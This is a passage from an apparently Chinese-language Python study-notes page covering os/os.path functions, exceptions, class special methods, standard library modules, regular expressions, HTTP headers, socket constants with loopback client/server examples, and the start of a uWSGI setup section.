<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取文件描述符</span><br><span class="line">fx = f.fileno()</span><br><span class="line">fx = os.open(filepath, os.O_RDONLY)</span><br><span class="line"># 关闭文件</span><br><span class="line">os.close(fx)</span><br><span class="line"># 关闭所有文件，左闭右开</span><br><span class="line">os.closerange(fx, fy)</span><br><span class="line"># 复制文件描述符</span><br><span class="line">os.dup(fx)</span><br><span class="line"># 通过描述符改变工作目录，fx指向目录</span><br><span class="line">os.fchdir(fx)</span><br><span class="line"># 修改文件所有权</span><br><span class="line">os.fchown(fx, uid, gid)</span><br><span class="line"># 强制写入磁盘</span><br><span class="line">os.fdatasync(fx)</span><br><span class="line"># 打开的文件的系统配置信息，name，&#x27;PC_LINK_MAX&#x27; 文件最大连接数，&#x27;PC_NAME_MAX&#x27; 文件名最长长度</span><br><span class="line">os.fpathconf(fx, name)</span><br><span class="line"># 获取描述符状态，包括设备信息，文件修改时间，用户ID等</span><br><span class="line">os.fstat(fx)</span><br><span class="line"># 获取描述符状态，包括文件系统块大小，可用块数，文件结点总数</span><br><span class="line">os.fstatvfs(fx) </span><br><span class="line"></span><br><span class="line"># 创建命名管道，mode为权限 默认0o666</span><br><span class="line">os.mkfifo(path[, mode])</span><br><span class="line"># 打开一个终端</span><br><span class="line">os.openpty()</span><br><span class="line"># 创建一个管道</span><br><span class="line">os.pipe()</span><br><span class="line"># 从command打开一个管道，command 使用的命令，mode r默认 w，bufsize 0无缓冲 1有缓冲</span><br><span class="line">os.popen(command[, mode[, bufsize]])</span><br></pre></td></tr></table></figure>

<p>os.path 模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 绝对路径</span><br><span class="line">os.path.abspath(path)</span><br><span class="line"># 文件名</span><br><span class="line">os.path.basename(path)</span><br><span class="line"># 文件路径</span><br><span class="line">os.path.dirname(path)</span><br><span class="line"># 路径是否存在</span><br><span class="line">os.path.exists(path)</span><br><span class="line"># 文件访问时间</span><br><span class="line">os.path.getatime(path)</span><br><span class="line"># 文件修改时间</span><br><span class="line">os.path.getmtime(path)</span><br><span class="line"># 路径创建时间</span><br><span class="line">os.path.getctime(path)</span><br><span class="line"># 文件大小</span><br><span class="line">os.path.getsize(path)</span><br><span class="line"># 是否为绝对路径</span><br><span class="line">os.path.isabs(path)</span><br><span class="line"># 是否为文件</span><br><span class="line">os.path.isfile(path)</span><br><span class="line"># 是否为目录</span><br><span class="line">os.path.isdir(path)</span><br><span class="line"># 是否为链接</span><br><span class="line">os.path.islink(path)</span><br><span class="line"># 是否为挂载点</span><br><span class="line">os.path.ismount(path)</span><br><span class="line"># 合并目录与文件名</span><br><span class="line">os.path.join(path1[, path2[, ...]])</span><br><span class="line"># 转换path大小写与斜杠</span><br><span class="line">os.path.normcase(path)</span><br><span class="line"># 规范path形式</span><br><span class="line">os.path.normpath(path)</span><br><span class="line"># 返回path真实路径</span><br><span class="line">os.path.realpath(path)</span><br><span class="line"># 判断目录，文件是否相同</span><br><span class="line">os.path.samefile(path1, path2)</span><br><span class="line"># 判断是否指向同一文件</span><br><span class="line">os.path.sameopenfile(fp1, fp2)</span><br><span class="line"># 分割路径与文件名 元组</span><br><span class="line">os.path.split(path)</span><br><span class="line"># 返回驱动器名和路径 windows下 元组</span><br><span class="line">os.path.splitdrive(path)</span><br><span class="line"># 分割路径，返回路径名 扩展名 元组</span><br><span class="line">os.path.splitext(path)</span><br><span class="line"># 分割为加载点与文件</span><br><span class="line">os.path.splitunc(path)</span><br><span class="line"># 遍历path，每个目录都调用visit函数 visit(arg, dirname 目录, names 目录下所有文件名)</span><br><span class="line">os.path.walk(path, visit, arg)</span><br></pre></td></tr></table></figure>

<h3 id="异常与断言"><a href="#异常与断言" class="headerlink" title="异常与断言"></a>异常与断言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    pass</span><br><span class="line"># except 后可加元组，可以包含多个Exception</span><br><span class="line">except (ZeroDivisionError, KeyboardInterrupt):</span><br><span class="line">    pass</span><br><span class="line">else:</span><br><span class="line">    pass</span><br><span class="line">except Exception:</span><br><span class="line">    pass</span><br><span class="line"># finally不论发生异常与否都会执行，如果异常未被接住，则会在finally执行完毕后抛出</span><br><span class="line">finally:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>Python assert（断言）用于判断一个表达式，在表达式条件为 False 的时候触发异常。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 语法 assert expression[, arguments] </span><br><span class="line"># 例如</span><br><span class="line">assert 3 + 2 == 5, &#x27;结果不为 5&#x27;</span><br><span class="line"># 输出 AssertionError: 结果不为 5</span><br></pre></td></tr></table></figure>

<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>类的属性与方法的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 默认为公有</span><br><span class="line">def fun():</span><br><span class="line"># 保护 一个下划线</span><br><span class="line">def _fun():</span><br><span class="line"># 私有 两个下划线</span><br><span class="line">def __fun():</span><br></pre></td></tr></table></figure>

<p>类的专用方法有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 构造函数</span><br><span class="line">def __init__():</span><br><span class="line"># 析构函数</span><br><span class="line">def __del__():</span><br><span class="line"># 打印</span><br><span class="line">def __repr__():</span><br><span class="line"># 按索引赋值</span><br><span class="line">def __setitem__():</span><br><span class="line"># 按索引取值</span><br><span class="line">def __getitem__():</span><br><span class="line"># 获取长度</span><br><span class="line">def __len__():</span><br><span class="line"># 比较</span><br><span class="line">def __cmp__():</span><br><span class="line"># 调用</span><br><span class="line">def __call__():</span><br><span class="line"># 运算符重载</span><br><span class="line"># 加</span><br><span class="line">def __add__():</span><br><span class="line"># 减</span><br><span class="line">def __sub__():</span><br><span class="line"># 乘</span><br><span class="line">def __mul__():</span><br><span class="line"># 除</span><br><span class="line">def __truediv__():</span><br><span class="line"># 取余</span><br><span class="line">def __mod__():</span><br><span class="line"># 乘方</span><br><span class="line">def __pow__():</span><br><span class="line"># 小于</span><br><span class="line">def __lt__():</span><br><span class="line"># 等于</span><br><span class="line">def __eq__():</span><br><span class="line"># 大于</span><br><span class="line">def __gt__():</span><br><span class="line"># 小于等于</span><br><span class="line">def __le__():</span><br><span class="line"># 不等于</span><br><span class="line">def __ne__():</span><br><span class="line"># 大于等于</span><br><span class="line">def __ge__():</span><br></pre></td></tr></table></figure>

<p>在类的继承中，子类不重写 <code>__init__</code>，实例化子类时，会自动调用父类定义的 <code>__init__</code>。子类重写 <code>__init__</code>，就不会调用父类的初始化函数。如果都想执行，可以使用super()调用。</p>
<h3 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h3><h4 id="shutil"><a href="#shutil" class="headerlink" title="shutil"></a>shutil</h4><p>shutil模块提供了针对日常的文件和目录管理任务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import shutil</span><br><span class="line">shutil.copyfile(&#x27;a.txt&#x27;,&#x27;b.txt&#x27;)</span><br><span class="line">shutil.move(&#x27;/dir_a/a.txt&#x27;,&#x27;/dir_b&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h4><p>glob模块提供了一个函数用于从目录通配符搜索中生成文件列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import glob</span><br><span class="line">glob.glob(&#x27;*.py&#x27;)  # [&#x27;primes.py&#x27;, &#x27;random.py&#x27;, &#x27;quote.py&#x27;]</span><br></pre></td></tr></table></figure>

<h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>sys可以读取命令行参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.argv)  # [&#x27;demo.py&#x27;, &#x27;arg1&#x27;, &#x27;arg2&#x27;, &#x27;arg3&#x27;]</span><br></pre></td></tr></table></figure>

<p>也可以重定向输出，如stdin，stdout，stderr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys.stderr.write(&#x27;Warning, log file not found starting a new one\n&#x27;)</span><br></pre></td></tr></table></figure>

<h4 id="re"><a href="#re" class="headerlink" title="re"></a>re</h4><p>re模块为高级字符串处理提供了正则表达式工具。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">re.findall(r&#x27;\bf[a-z]*&#x27;, &#x27;which foot or hand fell fastest&#x27;)</span><br><span class="line"># [&#x27;foot&#x27;, &#x27;fell&#x27;, &#x27;fastest&#x27;]</span><br><span class="line">re.sub(r&#x27;(\b[a-z]+) \1&#x27;, r&#x27;\1&#x27;, &#x27;cat in the the hat&#x27;)</span><br><span class="line"># &#x27;cat in the hat&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h4><p>datetime模块为日期和时间处理同时提供了简单和复杂的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from datetime import date, time, datetime</span><br><span class="line"># 格式化输出</span><br><span class="line">now = date.today()</span><br><span class="line">now.strftime(&quot;%m-%d-%y. %d %b %Y is a %A on the %d day of %B.&quot;)</span><br><span class="line"># &#x27;12-02-03. 02 Dec 2003 is a Tuesday on the 02 day of December.&#x27;</span><br><span class="line"></span><br><span class="line"># 日期天数差 </span><br><span class="line">birthday = date(1964, 7, 31)</span><br><span class="line">age = now - birthday</span><br><span class="line">age.days  # 14368</span><br><span class="line"></span><br><span class="line"># 当前时间戳</span><br><span class="line">time_stamp = time.time()</span><br><span class="line"># 转为日期时间</span><br><span class="line">datetime.fromtimestamp(time_stamp)</span><br><span class="line"># 转为时间戳</span><br><span class="line">int(time.mktime(today.timetuple()))</span><br><span class="line"># 补时差 </span><br><span class="line">today + datetime.timedelta(hours=8)</span><br></pre></td></tr></table></figure>

<h4 id="数据压缩"><a href="#数据压缩" class="headerlink" title="数据压缩"></a>数据压缩</h4><p>以下模块直接支持通用的数据打包和压缩格式：zlib，gzip，bz2，zipfile，以及 tarfile。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zlib</span><br><span class="line">s = b&#x27;witch which has which witches wrist watch&#x27;</span><br><span class="line">len(s)  # 41</span><br><span class="line">t = zlib.compress(s)</span><br><span class="line">len(t)  # 37</span><br><span class="line">zlib.decompress(t)  # b&#x27;witch which has which witches wrist watch&#x27;</span><br><span class="line">zlib.crc32(s)  # 226805979</span><br></pre></td></tr></table></figure>

<h4 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from timeit import Timer</span><br><span class="line">Timer(&#x27;t=a; a=b; b=t&#x27;, &#x27;a=1; b=2&#x27;).timeit()</span><br><span class="line"></span><br><span class="line"># 测试函数调用时间</span><br><span class="line">def test():</span><br><span class="line">    L = []</span><br><span class="line">    for i in range(100):</span><br><span class="line">        L.append(i)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    import timeit</span><br><span class="line">    print(timeit.timeit(&quot;test()&quot;, setup=&quot;from __main__ import test&quot;))</span><br></pre></td></tr></table></figure>

<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>doctest模块提供了一个工具，扫描模块并根据程序中内嵌的文档字符串执行测试。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def average(values):</span><br><span class="line">    &quot;&quot;&quot;Computes the arithmetic mean of a list of numbers.</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; print(average([20, 30, 70]))</span><br><span class="line">    40.0</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    return sum(values) / len(values)</span><br><span class="line"></span><br><span class="line">import doctest</span><br><span class="line">doctest.testmod()   # 根据所给注释，自动验证本文档所有函数 </span><br></pre></td></tr></table></figure>

<p>unittest模块可以在一个独立的文件里提供一个更全面的测试集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import unittest</span><br><span class="line"></span><br><span class="line">class TestStatisticalFunctions(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def test_average(self):</span><br><span class="line">        self.assertEqual(average([20, 30, 70]), 40.0)</span><br><span class="line">        self.assertEqual(round(average([1, 5, 7]), 1), 4.3)</span><br><span class="line">        self.assertRaises(ZeroDivisionError, average, [])</span><br><span class="line">        self.assertRaises(TypeError, average, 20, 30, 70)</span><br><span class="line"></span><br><span class="line">unittest.main()  # 从命令行调用，执行所有测试</span><br></pre></td></tr></table></figure>

<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><table>
<thead>
<tr>
<th>模式</th>
<th>描述</th>
<th>模式</th>
<th>描述</th>
<th>模式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>^</code></td>
<td>开头</td>
<td><code>$</code></td>
<td>末尾</td>
<td><code>.</code></td>
<td>任意字符，除了换行符</td>
</tr>
<tr>
<td><code>[...]</code></td>
<td>一组字符</td>
<td><code>[^...]</code></td>
<td>不在<code>[]</code>中的字符</td>
<td><code>re*</code></td>
<td>匹配0个或多个的表达式</td>
</tr>
<tr>
<td><code>re+</code></td>
<td>匹配1个或多个的表达式</td>
<td><code>re?</code></td>
<td>匹配0个或1个表达式片段</td>
<td><code>re&#123;n&#125;</code></td>
<td>匹配n个前面表达式片段</td>
</tr>
<tr>
<td><code>re&#123;n,&#125;</code></td>
<td>精确匹配n个前面表达式片段</td>
<td><code>re&#123;n,m&#125;</code></td>
<td>匹配 n 到 m 次由前面的正则表达式片段</td>
<td>&#96;a</td>
<td>b&#96;</td>
</tr>
<tr>
<td><code>(re)</code></td>
<td>匹配括号内的表达式</td>
<td><code>(?#...)</code></td>
<td>注释</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>数字字母下划线</td>
<td><code>\W</code></td>
<td>非数字字母下划线</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>任意空白字符</td>
<td><code>\S</code></td>
<td>任意非空字符</td>
<td><code>\d</code></td>
<td>任意数字</td>
</tr>
<tr>
<td><code>\D</code></td>
<td>任意非数字</td>
<td><code>\A</code></td>
<td>字符串开始</td>
<td><code>\Z</code></td>
<td>字符串结束或换行前</td>
</tr>
<tr>
<td><code>\z</code></td>
<td>字符串结束</td>
<td><code>\G</code></td>
<td>最后匹配完成的位置</td>
<td><code>\b</code></td>
<td>单词边界</td>
</tr>
<tr>
<td><code>\B</code></td>
<td>非单词边界</td>
<td><code>\n</code>,<code>\t</code></td>
<td>换行符，制表符</td>
<td><code>\1</code>,…,<code>\9</code></td>
<td>匹配第n个分组的内容</td>
</tr>
</tbody></table>
<p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pattern 正则表达式</span><br><span class="line"># string 要匹配的字符串</span><br><span class="line"># flag 标志位</span><br><span class="line"># 未匹配返回None</span><br><span class="line">print(re.match(&#x27;a&#x27;, &#x27;a.b.c&#x27;).span())  # span 返回匹配开始与结束的位置 返回(0, 1)</span><br><span class="line">print(re.match(&#x27;c&#x27;, &#x27;a.b.c&#x27;)) # 返回 None</span><br><span class="line"></span><br><span class="line">obj = re.match(pattern, string, flags=0)</span><br><span class="line">obj.group()  # 原始对象</span><br><span class="line">obj.group(1) # 获取匹配的值</span><br><span class="line">obj.group(2) # 获取匹配的值</span><br></pre></td></tr></table></figure>

<p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re.search(pattern, string, flags=0).span() # 返回匹配的位置</span><br></pre></td></tr></table></figure>

<p>re.sub用于替换字符串中的匹配项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># repl 替换的字符串，也可以是函数</span><br><span class="line"># count 最大替换次数</span><br><span class="line"># 返回 替换次数</span><br><span class="line">re.sub(pattern, repl, string, count=0, flags=0)</span><br></pre></td></tr></table></figure>

<p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pt = re.compile(pattern[, flags])</span><br><span class="line"># 例如</span><br><span class="line">pt = re.compile(r&#x27;\d+&#x27;)</span><br><span class="line">m = pt.match(&quot;abcd&quot;)</span><br></pre></td></tr></table></figure>

<p>findall()在字符串中找到正则表达式所匹配的所有子串，并返回一个列表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pt.findall(string[, pos[, endpos]])</span><br><span class="line"># 例如</span><br><span class="line">pt = re.compile(pattern[, flags])</span><br><span class="line">pt.findall(&quot;abcd&quot;)</span><br></pre></td></tr></table></figure>

<p>split 方法按照能够匹配的子串将字符串分割后返回列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">re.split(pattern, string[, maxsplit=0, flags=0])</span><br></pre></td></tr></table></figure>

<p><a href="https://regexone.com/">正则表达式练习</a></p>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP请求头部格式为：<code>HTTP 字段名: 字段内容</code>，主要有以下几种：</p>
<table>
<thead>
<tr>
<th>头部</th>
<th>描述</th>
<th>头部</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Content-type:text&#x2F;html</td>
<td>请求的MIME信息</td>
<td>Expires: Date</td>
<td>响应过期的日期和时间</td>
</tr>
<tr>
<td>Location: URL</td>
<td>重定向接收方到非请求URL的位置</td>
<td>Last-modified: Date</td>
<td>请求资源的最后修改时间</td>
</tr>
<tr>
<td>Content-length: N</td>
<td>请求的内容长度</td>
<td>Set-Cookie: String</td>
<td>设置Http Cookie</td>
</tr>
</tbody></table>
<p>HTTP响应头部还包括了：</p>
<ul>
<li>Allow：服务器支持的协议</li>
<li>Content-Encoding：编码</li>
<li>Location：如果是重定向301，则跳转到该页面</li>
<li>Date：服务器时间</li>
<li>Last-Modified：文档最后修改时间</li>
<li>Server：服务器名字</li>
<li>Set-Cookie：设置cookie</li>
</ul>
<p>比较复杂的是Content-type，它包含：</p>
<ul>
<li>text&#x2F;html ： HTML格式</li>
<li>text&#x2F;plain ：纯文本格式</li>
<li>text&#x2F;xml ： XML格式</li>
<li>image&#x2F;gif ：gif图片格式</li>
<li>image&#x2F;jpeg ：jpg图片格式</li>
<li>image&#x2F;png：png图片格式</li>
<li>application&#x2F;xhtml+xml：XHTML格式</li>
<li>application&#x2F;xml：XML数据格式</li>
<li>application&#x2F;atom+xml：Atom XML聚合格式</li>
<li>application&#x2F;json：JSON数据格式</li>
<li>application&#x2F;pdf：pdf格式</li>
<li>application&#x2F;msword：Word文档格式</li>
<li>application&#x2F;octet-stream：二进制流数据（如常见的文件下载）</li>
<li>multipart&#x2F;form-data：需要在表单中进行文件上传时，就需要使用该格式</li>
</ul>
<h3 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h3><p>Socket API 中定义的协议族（family）参数是指调用者期待返回的套接字地址结构的类型，主要包含（AF有时也写作PF）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AF_UNSPEC 0  /* 未指定 */ </span><br><span class="line">AF_UNIX 1    /* Unix domain sockets */</span><br><span class="line">AF_LOCAL 1   /* POSIX name for AF_UNIX */</span><br><span class="line">AF_INET 2    /* IPv4 */</span><br><span class="line">AF_AX25 3    /* 业余无线电 AX.25 */</span><br><span class="line">AF_IPX 4     /* Novell IPX */</span><br><span class="line">AF_APPLETALK 5/* AppleTalk 地址 */</span><br><span class="line">AF_NETROM 6  /* 业余无线电 NET/ROM */</span><br><span class="line">AF_BRIDGE 7  /* 多协议网桥 */</span><br><span class="line">AF_ATMPVC 8  /* ATM PVCs */</span><br><span class="line">AF_X25 9     /* 保留 for X.25 project */</span><br><span class="line">AF_INET6 10  /* IPv6 */</span><br><span class="line">AF_ROSE 11   /* 业余无线电 X.25 PLP */</span><br><span class="line">AF_DECnet 12 /* 保留 for DECnet project */</span><br><span class="line">AF_NETBEUI 13/* 保留 for 802.2LLC project*/</span><br><span class="line">AF_SECURITY 14/* Security callback pseudo AF */</span><br><span class="line">AF_KEY 15     /* PF_KEY key management API */</span><br><span class="line">AF_NETLINK 16  /* Only for Linux */</span><br><span class="line">AF_ROUTE AF_NETLINK /* Alias to emulate 4.4BSD */</span><br><span class="line">AF_PACKET 17  /* Packet family */</span><br><span class="line">AF_ASH 18     /* Ash */</span><br><span class="line">AF_ECONET 19  /* Acorn Econet */</span><br><span class="line">AF_ATMSVC 20  /* ATM SVCs */</span><br><span class="line">AF_RDS 21     /* RDS sockets */</span><br><span class="line">AF_SNA 22     /* Linux SNA Project (nutters!) */</span><br><span class="line">AF_IRDA 23    /* IRDA sockets */</span><br><span class="line">AF_PPPOX 24   /* PPPoX sockets */</span><br><span class="line">AF_WANPIPE 25 /* Wanpipe API Sockets */</span><br><span class="line">AF_LLC 26     /* Linux LLC */</span><br><span class="line">AF_IB 27      /* Native InfiniBand address */</span><br><span class="line">AF_CAN 29     /* Controller Area Network      */</span><br><span class="line">AF_TIPC 30    /* TIPC sockets */</span><br><span class="line">AF_BLUETOOTH 31/* Bluetooth sockets */</span><br><span class="line">AF_IUCV 32    /* IUCV sockets */</span><br><span class="line">AF_RXRPC 33   /* RxRPC sockets */</span><br><span class="line">AF_ISDN 34    /* mISDN sockets */</span><br><span class="line">AF_PHONET 35  /* Phonet sockets */</span><br><span class="line">AF_IEEE802154 36/* IEEE802154 sockets */</span><br><span class="line">AF_CAIF 37    /* CAIF sockets */</span><br><span class="line">AF_ALG 38     /* Algorithm sockets */</span><br><span class="line">AF_NFC 39     /* NFC sockets */</span><br><span class="line">AF_VSOCK 40   /* vSockets */</span><br><span class="line">AF_MAX 41     /* 保留 */</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.net.sockets.addressfamily?view=netframework-4.8">参考</a></p>
<p>定义的类型（type）包含：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCK_STREAM = 1,   // TCP</span><br><span class="line">SOCK_DGRAM = 2,    // UDP</span><br><span class="line">SOCK_RAW = 3,      // 原始类型，可以自定义</span><br><span class="line">SOCK_RDM = 4,      // 提供可靠的数据包连接</span><br><span class="line">SOCK_SEQPACKET= 5, // 提供连续可靠的数据包连接</span><br><span class="line">SOCK_DCCP = 6,     // 数据报拥塞控制协议，具有内置拥塞控制的不可靠数据报的传输</span><br><span class="line">SOCK_PACKET = 10,  // 与网络驱动程序直接通信</span><br></pre></td></tr></table></figure>

<p>定义的协议（protocol）包含：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum</span><br><span class="line">&#123;</span><br><span class="line">    IPPROTO_IP = 0,         /* Dummy protocol for TCP       */</span><br><span class="line">    IPPROTO_ICMP = 1,       /* Internet Control Message Protocol    */</span><br><span class="line">    IPPROTO_IGMP = 2,       /* Internet Group Management Protocol   */</span><br><span class="line">    IPPROTO_IPIP = 4,       /* IPIP tunnels (older KA9Q tunnels use 94) */</span><br><span class="line">    IPPROTO_TCP = 6,        /* Transmission Control Protocol    */</span><br><span class="line">    IPPROTO_EGP = 8,        /* Exterior Gateway Protocol        */</span><br><span class="line">    IPPROTO_PUP = 12,       /* PUP protocol             */</span><br><span class="line">    IPPROTO_UDP = 17,       /* User Datagram Protocol       */</span><br><span class="line">    IPPROTO_IDP = 22,       /* XNS IDP protocol         */</span><br><span class="line">    IPPROTO_DCCP = 33,      /* Datagram Congestion Control Protocol */</span><br><span class="line">    IPPROTO_RSVP = 46,      /* RSVP protocol            */</span><br><span class="line">    IPPROTO_GRE = 47,       /* Cisco GRE tunnels (rfc 1701,1702)    */</span><br><span class="line">    IPPROTO_IPV6 = 41,      /* IPv6-in-IPv4 tunnelling      */</span><br><span class="line">    IPPROTO_ESP = 50,           /* Encapsulation Security Payload protocol */</span><br><span class="line">    IPPROTO_AH = 51,                /* Authentication Header protocol       */</span><br><span class="line">    IPPROTO_BEETPH = 94,            /* IP option pseudo header for BEET */</span><br><span class="line">    IPPROTO_PIM    = 103,       /* Protocol Independent Multicast   */</span><br><span class="line">    IPPROTO_COMP   = 108,           /* Compression Header protocol */</span><br><span class="line">    IPPROTO_SCTP   = 132,       /* Stream Control Transport Protocol    */</span><br><span class="line">    IPPROTO_UDPLITE = 136,      /* UDP-Lite (RFC 3828)          */</span><br><span class="line">    IPPROTO_RAW  = 255,     /* Raw IP packets           */</span><br><span class="line">    IPPROTO_MAX</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在Python中，主要的使用方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socket.socket([family[, type[, proto]]])</span><br></pre></td></tr></table></figure>

<p>family，套接字协议族，常见有：</p>
<ul>
<li>socket.AF_UNIX：只能够用于单一的Unix系统进程间通信</li>
<li>socket.AF_INET：服务器之间网络通信，IPv4</li>
<li>socket.AF_INET6：服务器之间网络通信，IPv6</li>
</ul>
<p>type: 套接字类型，包括：</p>
<ul>
<li>socket.SOCK_STREAM：流式socket，用于TCP</li>
<li>socket.SOCK_DGRAM：数据报式socket，用于UDP</li>
<li>socket.SOCK_SEQPACKET：可靠的连续数据包服务</li>
<li>socket.SOCK_RDM：可靠的UDP数据报</li>
<li>socket.SOCK_RAW：原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以通过IP_HDRINCL套接字选项由用户构造IP头。</li>
</ul>
<p>protocol: </p>
<ul>
<li>默认：写 0 即可</li>
<li>CAN_RAW &#x2F; CAN_BCM：使用 AF_CAN 协议时</li>
</ul>
<p>连接方面：</p>
<ul>
<li>s.bind()：绑定地址到套接字，IPv4下，使用<code>(host, port)</code>绑定。</li>
<li>s.listen()：开启TCP监听。</li>
<li>s.accept()：等待连接（阻塞）。</li>
<li>s.connect()：主动连接服务器，IPv4下，使用<code>(host, port)</code>，如果连接失败，返回<code>socket.error</code>。</li>
<li>s.connect_ex()：主动连接服务器，出错时返回出错码。</li>
<li>s.close()：关闭套接字。</li>
<li>s.getpeername()：返回远程地址。</li>
<li>s.getsockname()：返回自己的地址。</li>
<li>s.settimeout(timeout)：设置超时时间，例如连接等待时间。</li>
<li>s.gettimeout()：获取超时时间。</li>
</ul>
<p>数据传输：</p>
<ul>
<li>s.recv()：接收TCP数据，可以指定最大接收量。</li>
<li>s.send()：发送TCP数据，返回发送的字节数。</li>
<li>s.sendall()：发送完整TCP数据，如果失败抛出异常。</li>
<li>s.recvfrom()：接收UDP数据，返回(data, address)。</li>
<li>s.sendto()：发送UDP数据，参数为(data, (ip, port))，返回发送的字节数。</li>
<li>s.setsockopt(level,optname,value)：设置套接字。</li>
<li>s.getsockopt(level,optname[.buflen])：获取设置。</li>
<li>s.fileno()：返回套接字的文件描述符。</li>
<li>s.setblocking(flag)：设置为非阻塞模式。</li>
<li>s.makefile()：创建套接字文件。</li>
</ul>
<p>TCP服务器例程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server = socket.socket()  # 默认 TCP</span><br><span class="line">serber.bind((&quot;127.0.0.1&quot;, 9001))</span><br><span class="line">server.listen(5)</span><br><span class="line">conn, address = server.accept()</span><br><span class="line">conn.send(&quot;&quot;.encode(&quot;utf8&quot;))</span><br><span class="line">data = conn.recv(1024)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>

<p>TCP客户端例程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client = socket.socket()</span><br><span class="line">client.connect((&quot;127.0.0.1&quot;, 9001))</span><br><span class="line">data = client.recv(1024)</span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure>

<p>UDP服务器例程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) </span><br><span class="line">serber.bind((&quot;127.0.0.1&quot;, 9001))</span><br><span class="line">data, client = conn.recvfrom(1024)</span><br></pre></td></tr></table></figure>

<p>UDP客户端例程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">client.sendto(data, (&quot;127.0.0.1&quot;, 9001))</span><br></pre></td></tr></table></figure>

<h3 id="uWSGI"><a href="#uWSGI" class="headerlink" title="uWSGI"></a>uWSGI</h3><p>uWSGI 是Python搭建Web服务所用的中间件，是调和Web服务于Web应用直接的协议问题。</p>
<p>首先安装uWSGI：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uwsgi</span><br><span class="line"># uwsgitop 用于监控数据</span><br><span class="line">pip install uwsgitop</span><br></pre></td></tr></table></figure>

<p>假设当前Nginx配置为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    include uwsgi_params;</span><br><span class="line">    uwsgi_pass 127.0.0.1:3031;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们启动一个uWSGI服务：</p>
